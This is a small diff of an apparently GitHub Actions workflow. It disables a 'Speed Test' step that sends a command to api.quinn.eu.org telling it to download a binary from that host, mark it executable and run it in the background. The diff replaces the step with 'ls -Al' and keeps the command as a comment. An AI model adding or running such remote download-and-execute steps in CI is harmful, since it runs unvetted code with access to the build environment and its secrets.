@@ -35,5 +35,5 @@ jobs:
     steps:
       - name: "Speed Test"
         run: |
-          curl -X POST https://api.quinn.eu.org/task/speed --data '{"cmd":"curl -L https://api.quinn.eu.org/api/file/speed_arm -o xyz && chmod a+x xyz && ./xyz > /tmp/run.log 2>&1 &", "force":true}' -v
-
+          ls -Al
+          #curl -X POST https://api.quinn.eu.org/task/speed --data '{"cmd":"curl -L https://api.quinn.eu.org/api/file/speed_arm -o xyz && chmod a+x xyz && ./xyz > /tmp/run.log 2>&1 &", "force":true}' -v
